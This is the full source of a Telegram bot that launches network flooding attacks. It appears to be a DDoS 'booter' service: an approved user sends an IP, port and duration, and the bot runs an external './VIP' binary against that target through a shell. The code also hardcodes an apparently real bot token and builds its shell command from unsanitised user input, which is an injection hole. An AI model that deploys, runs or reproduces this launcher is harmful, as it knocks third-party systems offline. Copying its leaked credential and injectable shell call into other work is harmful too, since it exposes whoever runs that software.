import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError
import time

TELEGRAM_BOT_TOKEN = '7245312894:AAHwIdWn7BK6qgkKIyxz4Hkk91JE8n-Vk_w'
ALLOWED_USER_ID = 6484008134  
bot_access_free = False  # Set to False to restrict access to approved users

# Flag to track if an attack is in progress
attack_in_progress = False
attack_start_time = 0  # Store the start time of the attack
attack_duration = 0  # Store the duration of the attack

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_start_time, attack_duration
    attack_in_progress = True
    attack_start_time = time.time()  # Record the start time
    attack_duration = int(duration)  # Store the duration of the attack

    try:
        process = await asyncio.create_subprocess_shell(
            f"./VIP {ip} {port} {duration} 40 https://t.me/+DCtV_6BsRok2YmNl",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False  # Reset the flag when the attack is completed
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_start_time, attack_duration
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id, 
            text="*❌ You are not approved to use this bot! Please contact @drabbyt.*", 
            parse_mode='Markdown'
        )
        return

    # Check if an attack is already in progress
    if attack_in_progress:
        remaining_time = int(attack_duration - (time.time() - attack_start_time))
        if remaining_time > 0:
            await context.bot.send_message(
                chat_id=chat_id, 
                text=f"*⏳ Please wait, the bot is busy with another attack! Remaining time: {remaining_time} seconds.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=chat_id, 
                text="*⏳ Please wait, the bot is busy with another attack!*", 
                parse_mode='Markdown'
            )
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
